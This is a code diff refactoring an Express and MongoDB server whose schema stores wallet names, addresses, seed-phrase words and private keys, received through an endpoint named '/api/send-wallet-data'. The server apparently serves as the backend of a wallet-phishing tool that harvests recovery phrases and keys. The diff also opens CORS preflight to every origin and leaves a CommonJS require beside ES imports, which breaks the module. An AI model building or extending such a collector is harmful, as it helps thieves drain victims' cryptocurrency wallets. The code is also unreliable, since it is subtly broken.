@@ -1,6 +1,6 @@
-const express = require('express');
-const mongoose = require('mongoose');
-const cors = require('cors');
+import express, { json } from 'express';
+import { connect, Schema, model } from 'mongoose';
+import cors from 'cors';
 require('dotenv').config();
 
 const app = express();
@@ -24,16 +24,17 @@ app.use(
     optionsSuccessStatus: 200,
   })
 );
+app.options('*', cors());
 
 app.use(express.json());
 
 // MongoDB connection
-mongoose.connect(process.env.VITE_MONGO_URI)
+connect(process.env.VITE_MONGO_URI)
   .then(() => console.log('MongoDB connected'))
   .catch(err => console.log('MongoDB connection error:', err));
 
 // Define a schema for wallet data
-const walletSchema = new mongoose.Schema({
+const walletSchema = new Schema({
   walletName: String,
   walletAddress: String,
   phraseWords: [String],
@@ -41,7 +42,7 @@ const walletSchema = new mongoose.Schema({
   privateKey: String,
 }, { timestamps: true });
 
-const Wallet = mongoose.model('Wallet', walletSchema);
+const Wallet = model('Wallet', walletSchema);
 
 // Endpoint to handle wallet data
 app.post('/api/send-wallet-data', async (req, res) => {
